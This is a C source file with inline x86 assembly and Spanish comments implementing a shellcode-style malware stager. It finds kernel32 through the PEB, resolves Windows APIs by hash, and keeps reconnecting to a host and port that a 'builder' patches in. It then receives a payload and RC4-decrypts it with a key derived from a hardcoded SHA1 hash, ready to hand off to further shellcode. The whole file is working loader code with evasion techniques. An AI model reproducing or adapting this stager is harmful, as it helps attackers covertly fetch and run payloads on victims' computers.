#pragma optimize("gsy", on)
#pragma comment(linker, "/NODEFAULTLIB")
#pragma comment(linker, "/ENTRY:main")

//COMPILACION CONDICIONADA!!
#define SHELLCODE
#undef SHELLCODE

#include <Windows.h>
#include "Macros.h"

//CONSTANTES DE ERROR
#define ERR_NO	0x0			//No hay error
#define ERR_FNC	0x1			//Error en LoadFunctions
#define ERR_HST 0x2			//Error al resolver el Hostname

DWORD FindFunction(DWORD BaseAddress,DWORD FunctionHash);
DWORD LoadFunctions(DWORD BaseAddress,DWORD lpHashes,DWORD numHashes);
void gtfo();

/*Se declaran las constantes con el formato "_%NombreAPI%" el valor es la posición de la dirección del API en el stack*/
CREATE_IDS(
			/*kernel32*/	(LoadLibraryA) (ExitProcess) (GlobalAlloc) (GlobalFree)
			/*ws2_32*/		(WSASocketA) (connect) (WSAStartup) (closesocket) (send) (inet_addr) (gethostbyname) (recv)
			/*advapi32*/	(CryptAcquireContextA) (CryptCreateHash) (CryptHashData) (CryptDeriveKey) (CryptDecrypt)
			/*variables*/	(hSocket) (Delta) (pBuff) (buffLen) (hProv) (hHash) (hKey)
		   )

void __declspec(naked) main(){
	__asm{
		jmp  start
IP:		EMIT_BYTE_ARRAY(('1') ('2') ('7') ('.') ('0') ('.') ('0') ('.') ('1')(0))
		//SHA1("karcrack:1234") = "5e5dc9ad5bc908f644797d39e86708209e15b641"
HASH:	EMIT_BYTE_ARRAY(('5') ('e') ('5') ('d') ('c') ('9') ('a') ('d') ('5') ('b') ('c') ('9') ('0') ('8') ('f') ('6') ('4') ('4') ('7') ('9') ('7') ('d') ('3') ('9') ('e') ('8') ('6') ('7') ('0') ('8') ('2') ('0') ('9') ('e') ('1') ('5') ('b') ('6') ('4') ('1'))
		kernel32_symbol_hashes:
		
		#define kernel32_count	4
		/*LoadLibraryA*/		HASH_AND_EMIT(('L') ('o') ('a') ('d') ('L') ('i') ('b') ('r') ('a') ('r') ('y') ('A'))
		/*ExitProcess*/			HASH_AND_EMIT(('E') ('x') ('i') ('t') ('P') ('r') ('o') ('c') ('e') ('s') ('s'))
		/*GlobalAlloc*/			HASH_AND_EMIT(('G') ('l') ('o') ('b') ('a') ('l') ('A') ('l') ('l') ('o') ('c'))
		/*GlobalFree*/			HASH_AND_EMIT(('G') ('l') ('o') ('b') ('a') ('l') ('F') ('r') ('e') ('e'))

		ws2_32_symbol_hashes:

		#define ws2_32_count	8
		/*WSASocketA*/			HASH_AND_EMIT(('W') ('S') ('A') ('S') ('o') ('c') ('k') ('e') ('t') ('A'))
		/*connect*/				HASH_AND_EMIT(('c') ('o') ('n') ('n') ('e') ('c') ('t'))
		/*WSAStartup*/			HASH_AND_EMIT(('W') ('S') ('A') ('S') ('t') ('a') ('r') ('t') ('u') ('p'))
		/*closesocket*/			HASH_AND_EMIT(('c') ('l') ('o') ('s') ('e') ('s') ('o') ('c') ('k') ('e') ('t'))
		/*send*/				HASH_AND_EMIT(('s') ('e') ('n') ('d'))
		/*inet_addr*/			HASH_AND_EMIT(('i') ('n') ('e') ('t') ('_') ('a') ('d') ('d') ('r'))
		/*gethostbyname*/		HASH_AND_EMIT(('g') ('e') ('t') ('h') ('o') ('s') ('t') ('b') ('y') ('n') ('a') ('m') ('e'))
		/*recv*/				HASH_AND_EMIT(('r') ('e') ('c') ('v'))

		advapi32_symbol_hashes:

		#define advapi32_count	5
		/*CryptAcquireContextA*/HASH_AND_EMIT( ('C') ('r') ('y') ('p') ('t') ('A') ('c') ('q') ('u') ('i') ('r') ('e') ('C') ('o') ('n') ('t') ('e') ('x') ('t') ('A') )
		/*CryptCreateHash*/		HASH_AND_EMIT( ('C') ('r') ('y') ('p') ('t') ('C') ('r') ('e') ('a') ('t') ('e') ('H') ('a') ('s') ('h') )
		/*CryptHashData*/		HASH_AND_EMIT( ('C') ('r') ('y') ('p') ('t') ('H') ('a') ('s') ('h') ('D') ('a') ('t') ('a') )
		/*CryptDeriveKey*/		HASH_AND_EMIT( ('C') ('r') ('y') ('p') ('t') ('D') ('e') ('r') ('i') ('v') ('e') ('K') ('e') ('y') )
		/*CryptDecrypt*/		HASH_AND_EMIT( ('C') ('r') ('y') ('p') ('t') ('D') ('e') ('c') ('r') ('y') ('p') ('t') )

start:
		//Reservamos espacio en la pila para las direcciones de las apis
		sub  esp, STACKSIZE
		//Usamos ebp como puntero al inicio del buffer donde se guardarán las apis
		//para así poder llamarlas en cualquier punto del programa
		mov  ebp, esp

#ifdef SHELLCODE
		//Sacamos el delta y lo guardamos
find_delta:
		fldz
		EMIT_BYTE_ARRAY((0xD9)(0x74)(0x24)(0xF4))	//fstenv SS:[esp-0x0C] (Para evitar el OPCODE innecesario hardcodeo la instruccion)
		pop  edi
		sub  edi, find_delta
		mov  [ebp+_Delta], edi			//Lo guardamos para luego :)
#endif

		//Obtenemos en eax la dirección de KERNEL32.DLL
find_kernel32:
		xor  eax, eax
		mov  esi, FS:[eax+0x30]			//ESI = &(PEB)
		mov  esi, [esi+0x0C]			//ESI = PEB->Ldr
		mov  esi, [esi+0x1C]			//ESI = PEB->Ldr.InInitOrder[0]
next_module:
		mov  eax, [esi+0x08]			//EAX = PEB->Ldr.InInitOrder[X].base_address
		mov  ecx, [esi+0x20]			//EDI = PEB->Ldr.InInitOrder[X].module_name (unicode)
		cmp  [ecx+0xC], '3'				//module_name[6] == '3'?
		je   find_kernel32_finished
		mov  esi, [esi]					//ESI = PEB->Ldr.InInitOrder[X].flink == NextModule
		jmp  next_module
find_kernel32_finished:

		//Cargamos las apis de kernel32 en la pila a partir de los hashes
		push kernel32_count				//Numero de hashes
		pushr(kernel32_symbol_hashes)	//Puntero al primer hash
		push eax						//Kernel32 BaseAddress
		call LoadFunctions

		//Obtenemos el BaseAddress de ws2_32
		push '23'						//push "32\0\0"
		push '_2sw'						//push "ws2_"
		push esp						//ESP = "ws2_32"
		call [ebp+_LoadLibraryA]		//call LoadLibraryA
		add  esp, 0x8					//Restauramos la pila
		add  ebp, (kernel32_count*4)	//Desplazamos el buffer para no pisar los punteros a las apis de kernel32
		push ws2_32_count				//Numero de Hashes
		pushr(ws2_32_symbol_hashes)		//Puntero al primer hash de ws2_32.dll
		push eax						//ws_32.dll BaseAddress
		call LoadFunctions
		sub  ebp, (kernel32_count*4)	//Lo restauramos al inicio del stack de APIs

		//Obtenemos el BaseAddress de advapi32
		cdq								//EDX = 0
		push edx						//push 0
		push '23ip'						//push "pi32"
		push 'avda'						//push "adva"
		push esp						//ESP = "advapi32"
		call [ebp+_LoadLibraryA]		//call LoadLibraryA
		add  esp, 0xC					//Restauramos la pila
		//Desplazamos el buffer para no pisar los punteros a las apis de kernel32 ni ws2_32
		add  ebp, (kernel32_count*4)+(ws2_32_count*4)
		push advapi32_count				//Numero de Hashes
		pushr(advapi32_symbol_hashes)	//Puntero al primer hash de advapi32
		push eax						//advapi32 BaseAddress
		call LoadFunctions
		//Lo restauramos al inicio del stack de APIs
		sub  ebp, (kernel32_count*4)+(ws2_32_count*4)

		//Llamamos a WSAStartup
		sub  esp, 0x190					//Reservamos espacio en la pila para WSADATA
		push esp                        //ESP = lpWSADATA
		push 0x202						//VersionRequested (2.2)
		call [ebp+_WSAStartup]			//call WSAStartup
		add  esp, 0x190					//Restauramos la pila

newSocket:
		cdq								//EDX = 0	(Si EAX >=0; WSAStartup siempre devuelve >=0)
		push edx						//push 0
		push edx						//push 0
		push edx						//push 0
		push edx						//push 0
		inc  edx						//EDX = 1 (SOCK_STREAM)
		push edx						//push SOCK_STREAM
		inc	 edx						//EDX = 2 (AF_INET)
		push edx						//push AF_INET
		call [ebp+_WSASocketA]			//call WSASocketA
		mov  [ebp+_hSocket], eax		//hSocket = EAX

		pushr(IP)						//push &IP
		call [ebp+_gethostbyname]		//call gethostbyname
		test eax, eax
		jne  NoErr						//Si fallamos al obtener el host mejor salimos...
		push ERR_HST
		call gtfo
NoErr:	add  eax, 0x20					//EAX = hostent.h_name
		push eax
		call [ebp+_inet_addr]			//call inet_addr
		//Construimos la sockaddr_in en la pila
		push eax						//push IP
		#define PORT 0xD0070002
		push PORT						//push PORT					(EL BUILDER PARCHEARÁ ESTO!!!! :D)
		mov  ebx, esp					//EBX = &sockaddr_in
BucleConectar:
		push 0x10						//push size(sockaddr_in)
		push ebx					    //push &sockaddr_in
		push [ebp+_hSocket]				//push hSocket
		call [ebp+_connect]				//call connect
		test eax, eax
		jl   BucleConectar
		add  esp, 0x8					//Reparamos la pila
recibir:
		push 0x1000						//push 0x1000
		push GPTR						//push GPTR
		call [ebp+_GlobalAlloc]			//call GlobalAlloc
		mov  [ebp+_pBuff], eax			//pBuffer = EAX

		push 0x1000						//Tamaño Buffer
		push eax						//Puntero Buffer
		push [ebp+_hSocket]				//hSocket
		call [ebp+_recv]				//call recv
		test eax, eax
		jle  KillSocket					//Se desconectó el socket, lo borramos y volvemos a conectar

init_crypt:
		cdq								//EDX = 0
		push CRYPT_VERIFYCONTEXT		//push CRYPT_VERIFYCONTEXT
		push PROV_RSA_FULL				//push PROV_RSA_FULL
		push edx						//push NULL
		push edx						//push NULL
		push ebp						//
		add  [esp], _hProv				//push &hProv
		call [ebp+_CryptAcquireContextA]//call CryptAcquireContextA

		cdq								//EDX = 0
		push ebp						//
		add  [esp], _hHash				//push &hHash
		push edx						//push 0
		push edx						//push 0
		push CALG_SHA1					//push CALG_SHA1
		push [ebp+_hProv]				//push hProv
		call [ebp+_CryptCreateHash]		//call CryptCreateHash

		cdq								//EDX = 0
		push edx						//push 0
		push 0x20						//push size(HASH)
		pushr(HASH)						//push &HASH
		push [ebp+_hHash]				//push hHash
		call [ebp+_CryptHashData]		//call CryptHashData
		
		push ebp						//
		add  [esp], _hKey				//push &hKey
		push 0x00800000					//push KEYLENGHT
		push [ebp+_hHash]				//push hHash
		push CALG_RC4					//push CALG_RC4
		push [ebp+_hProv]				//push hProv
		call [ebp+_CryptDeriveKey]		//call CryptDeriveKey

		cdq								//EDX = 0
		mov  DWORD PTR DS:[ebp+_buffLen],0x1000		//buffLen = 0x1000
		push ebp						//
		add  [esp], _buffLen			//push &buffLen
		push [ebp+_pBuff]				//push &pBuff
		push edx						//push 0
		push TRUE						//push TRUE
		push edx						//push 0
		push [ebp+_hKey]				//push hKey
		call [ebp+_CryptDecrypt]		//call CryptDecrypt

//proc main,LoadLibrary_,GetProcAddress_,hConexion,pHash (ENTRADA DE LA SHELLCODE DE Ark)
		jmp  salida						//Se acabo
KillSocket:
		push [ebp+_pBuff]
		call VirtualFree				//Liberamos el buffer
		push [ebp+_hSocket]
		call [ebp+_closesocket]			//Eliminamos el socket
		jmp  newSocket
salida:
		push ERR_NO
		call gtfo
	}
}

DWORD __declspec(naked) LoadFunctions(DWORD BaseAddress, DWORD lpHashes, DWORD numHashes){
	__asm{
		pushad
		mov  ebx, [esp+0x24]			//BaseAddress
		mov  esi, [esp+0x28]			//lpHashes
		mov  ecx, [esp+0x2C]			//numHashes

		lea  edi, [ebp+0x04]			//EDI = lpBuffer
		cdq								//EDX = 0
NextFunction:
		xor  eax, eax					//EAX = 0
		lodsw							//mov ax, WORD[esi]; esi+=2
		push eax						//FunctionHash
		push ebx						//BaseAddress
		call FindFunction
		test eax, eax
		jnz  NoErr
		push ERR_FNC
		call gtfo						//SALIMOS dando error ERR_FNC
NoErr:	mov  [edi+edx*4], eax			//Guardamos dir en buffer pila

		inc  edx						//EDX++
		dec  ecx						//ECX--
		jnz  NextFunction

		popad
		ret 0xC
	}
}

DWORD __declspec(naked) FindFunction(DWORD BaseAddress,DWORD FunctionHash){
	__asm{
find_function:
		pushad
		mov  ebp, [esp+0x24]			//EBP = &IMAGE_DOS_HEADER
		mov  eax, [ebp+0x3C]			//EAX = IMAGE_DOS_HEADER.e_lfanew
		mov  edi, [ebp+eax+0x78]		//EDI = IMAGE_OPTIONAL_HEADER->DataDirectory(IMAGE_FILE_EXPORT_DIRECTORY).VirtualAddress
		add  edi, ebp					//EDI = EAT (RVA)
		mov  ecx, [edi+0x18]			//ECX = IMAGE_EXPORT_DIRECTORY.NumberOfFunctions
		mov  ebx, [edi+0x20]			//EBX = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions (RVA)
		add  ebx, ebp					//EBX = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions (VA)
find_function_loop:
		jecxz find_function_finished	//Si ECX == 0 ya no quedan funciones por recorrer
		dec  ecx						//ECX--
		mov  esi, [ebx+ecx*4]			//ESI = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions[X] (RVA)
		add  esi, ebp					//ESI = IMAGE_EXPORT_DIRECTORY.AddressOfNames[X] (VA) Export Name Table
compute_hash:
		cdq								//EDX = 0
		cld								//Clear Direction Flag
compute_hash_again:
		xor  eax, eax					//EAX = 0
		lodsb							//AL = BYTE[ESI] //ESI++
		test al, al
		jz   compute_hash_finished
		shr  edx, 1
		shl  eax, 7
		xor  edx, eax
		jmp  compute_hash_again
compute_hash_finished:
find_function_compare:
		cmp  dx, WORD PTR DS:[esp+0x28]	//Comparamos el Hash con FunctionHash
		jnz  find_function_loop
		mov  ebx, [edi+0x24]			//EBX = IMAGE_EXPORT_DIRECTORY.AddressOfNames (RVA)
		add  ebx, ebp					//EBX = IMAGE_EXPORT_DIRECTORY.AddressOfNames (VA)
		mov  cx, [ebx+ecx*2]
		mov  ebx, [edi+0x1C]
		add  ebx, ebp
		mov  eax, [ebx+4*ecx]
		add  eax, ebp
find_function_finished:
		mov  [esp+0x1C], eax
		popad
		ret 0x8
	}
}

void __declspec(naked) gtfo(){
	__asm{
		push [esp+4]
		call [ExitProcess]
	}
}